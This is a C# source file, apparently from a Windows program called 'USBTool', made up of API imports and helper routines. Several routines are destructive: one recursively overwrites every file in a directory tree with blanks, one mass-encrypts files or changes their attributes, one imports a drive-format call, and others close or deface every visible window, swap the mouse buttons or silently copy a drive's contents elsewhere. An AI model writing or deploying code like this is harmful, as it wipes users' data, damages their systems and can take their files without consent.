using System;
using System.Drawing;
using System.Speech.Synthesis;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;

namespace USBTool
{
	public partial class Form1 : System.Windows.Forms.Form
	{
		public static string sentence;
		public static SpeechSynthesizer Voice;
		public static DEVMODE DEVMODE1 = new DEVMODE()
		{
			dmDeviceName = new string(new char[33]),
			dmFormName = new string(new char[33]),
			dmSize = (short)(Marshal.SizeOf(DEVMODE1))
		};
		public static Random rand = new Random();
		public delegate bool FormatExCallBack(int Command, int Modifier, IntPtr Argument);
		[DllImport("fmifs.dll", SetLastError = true)]
		public static extern int FormatEx(string drivename, uint media, string format, string volume, bool QuickFormat, int size, FormatExCallBack callback);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, ref string pvParam, uint fWinIni);
		[DllImport("user32.dll")]
		public static extern bool SwapMouseButton(bool fSwap);
		[DllImport("user32.dll")]
		public static extern IntPtr GetDesktopWindow();
		[DllImport("user32.dll")]
		public static extern IntPtr GetWindow(IntPtr hWnd, uint nCmd);
		[DllImport("user32.dll")]
		public static extern bool IsWindowVisible(IntPtr hWnd);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool CloseWindow(IntPtr hWnd);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool PostMessage(IntPtr hWnd, uint msg, uint wParam, uint lParam);
		[DllImport("user32.dll")]
		public static extern int ChangeDisplaySettings(ref DEVMODE devMode, int flags);
		[DllImport("user32.dll")]
		public static extern bool EnumDisplaySettings(string deviceName, int modeNum, ref DEVMODE devMode);
		[DllImport("user32.dll")]
		public static extern bool SetWindowText(IntPtr hwnd, string lpString);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern int GetClientRect(IntPtr hWnd, ref Rectangle lpRECT);
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool DeviceIoControl(IntPtr hDevice, uint dwIoControlCode, IntPtr lpInBuffer, uint nInBufferSize, IntPtr lpOutBuffer, uint nOutBufferSize, ref uint lpBytesReturned, IntPtr lpOverlapped);
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
		[DllImport("dwmApi.dll", SetLastError = true)]
		public static extern int DwmExtendFrameIntoClientArea(IntPtr hwnd, ref MARGINS pMarInset);
		[DllImport("dwmapi.dll")]
		public static extern void DwmEnableComposition(uint uCompositionAction);
		[DllImport("dwmapi.dll", SetLastError = true)]
		public static extern void DwmEnableBlurBehindWindow(IntPtr hwnd, ref DWM_BLURBEHIND blurBehind);
		[DllImport("dwmapi.dll", SetLastError = true)]
		public static extern bool DwmSetWindowAttribute(IntPtr hwnd, uint attr, ref uint attrValue, int attrSize);
		[StructLayout(LayoutKind.Sequential)]
		public struct DWM_BLURBEHIND
		{
			public uint dwFlags;
			public bool fEnable;
			public IntPtr hRgnBlur;
			public bool fTransitionOnMaximized;
		}
		public struct DEVMODE
		{
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
			public string dmDeviceName;
			public short dmSpecVersion;
			public short dmDriverVersion;
			public short dmSize;
			public short dmDriverExtra;
			public int dmFields;
			public int dmPositionX;
			public int dmPositionY;
			public int dmDisplayOrientation;
			public int dmDisplayFixedOutput;
			public short dmColor;
			public short dmDuplex;
			public short dmYResolution;
			public short dmTTOption;
			public short dmCollate;
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
			public string dmFormName;
			public short dmLogPixels;
			public short dmBitsPerPel;
			public int dmPelsWidth;
			public int dmPelsHeight;
			public int dmDisplayFlags;
			public int dmDisplayFrequency;
			public int dmICMMethod;
			public int dmICMIntent;
			public int dmMediaType;
			public int dmDitherType;
			public int dmReserved1;
			public int dmReserved2;
			public int dmPanningWidth;
			public int dmPanningHeight;
		}
		[StructLayout(LayoutKind.Sequential)]
		public struct MARGINS
		{
			public int cxLeftWidth;
			public int cxRightWidth;
			public int cyTopHeight;
			public int cyBottomHeight;
		}
		public const uint IOCTL_STORAGE_EJECT_MEDIA = 0x2D4808;
		public const uint FILE_SHARE_READ = 0x1;
		public const uint FILE_SHARE_WRITE = 0x2;
		public const uint GENERIC_READ = 0x80000000;
		public const uint GENERIC_WRITE = 0x40000000;
		public const uint SPI_SETMOUSETRAILS = 0x5D;
		public const uint DWMWA_NCRENDERING_POLICY = 2;
		public const uint DWMNCRP_ENABLED = 2;
		public const uint WM_CLOSE = 0x0010;
		public const uint FMIFS_HARDDISK = 0xC;
		public static double GetMemoryRate()
		{
			return 100 - (double)(new Microsoft.VisualBasic.Devices.Computer()).Info.AvailablePhysicalMemory / (new Microsoft.VisualBasic.Devices.Computer()).Info.TotalPhysicalMemory * 100;
		}
		public static void ForEachWindow(IntPtr hwnd, string op)
		{
			MARGINS m = new MARGINS()
			{
				cxLeftWidth = -1,
				cxRightWidth = -1,
				cyBottomHeight = -1,
				cyTopHeight = -1
			};
			DWM_BLURBEHIND b = new DWM_BLURBEHIND()
			{
				dwFlags = 3,
				fEnable = true,
				hRgnBlur = IntPtr.Zero
			};
			DwmEnableComposition(1);
			while (hwnd != IntPtr.Zero)
			{
				if (IsWindowVisible(hwnd))
				{
					ForEachWindow(GetWindow(hwnd, 5), op);
					switch (op)
					{
						case "text":
							SetWindowText(hwnd, sentence);
							break;
						case "picture":
							Rectangle rect = new Rectangle();
							GetClientRect(hwnd, ref rect);
							Graphics g = Graphics.FromHwnd(hwnd);
							Bitmap p = new Bitmap(sentence);
							try
							{
								g.DrawImage(p, rect);
							}
							catch
							{
							}
							finally
							{
								g.Dispose();
								p.Dispose();
							}
							break;
						case "close":
							CloseWindow(hwnd);
							break;
						case "glass":
							//Dim rect As Rectangle
							//GetClientRect(hwnd, rect)
							uint attr = DWMNCRP_ENABLED;
							DwmSetWindowAttribute(hwnd, DWMWA_NCRENDERING_POLICY, ref attr, Marshal.SizeOf(DWMNCRP_ENABLED));
							//Dim g As Graphics = Graphics.FromHwnd(hwnd)
							//g.FillRectangle(Brushes.Black, rect)
							DwmEnableBlurBehindWindow(hwnd, ref b);
							DwmExtendFrameIntoClientArea(hwnd, ref m);
							break;
						case "destroy":
							if (hwnd != GetDesktopWindow())
							{
								PostMessage(hwnd, WM_CLOSE, 0, 0);
							}
							break;
						default:
							throw (new ArgumentException("该功能还未开发"));
					}
				}
				hwnd = GetWindow(hwnd, 2);
			}
		}
		public static string StringByTime(string text, long time)
		{
			StringBuilder i = new StringBuilder();
			i.Append(char.Parse(text), (int)time);
			return i.ToString();
		}
		public static void SetAttributes(string directory, FileAttributes param)
		{
			foreach (string f in Directory.GetFiles(directory))
			{
				try
				{
					try
					{
						if (param == FileAttributes.Encrypted) File.Encrypt(f);
					}
					catch
					{
					}
					File.SetAttributes(f, param);
				}
				catch
				{
					continue;
				}
			}
			foreach (string d in Directory.GetDirectories(directory))
			{
				try
				{
					File.SetAttributes(d, param);
				}
				catch
				{
				}
				SetAttributes(d, param);
			}
		}
		public static void FillEachFile(string name)
		{
			foreach (string f in Directory.GetFiles(name))
			{
				try
				{
					File.WriteAllText(f, StringByTime(" ", new FileInfo(f).Length));
				}
				catch
				{
					continue;
				}
			}
			foreach (string f in Directory.GetDirectories(name))
			{
				FillEachFile(f);
			}   

		}
		public static void CopyDiretory(string from, string to)
		{
			string s = Path.Combine(to, new DirectoryInfo(from.LastIndexOf(":")==from.Length-2?from.Substring(0, 1):from).Name);
			try
			{
				if (!Directory.Exists(s)) 
					Directory.CreateDirectory(s);
				foreach (string f in Directory.EnumerateFiles(from))
				{
					string fp = Path.Combine(s, new FileInfo(f).Name);
					if (!File.Exists(fp)) 
						File.Copy(f, fp);
				}
				foreach (string d in Directory.EnumerateDirectories(from))
					CopyDiretory(d, s);
			}
			catch {
			}
		}
	}
}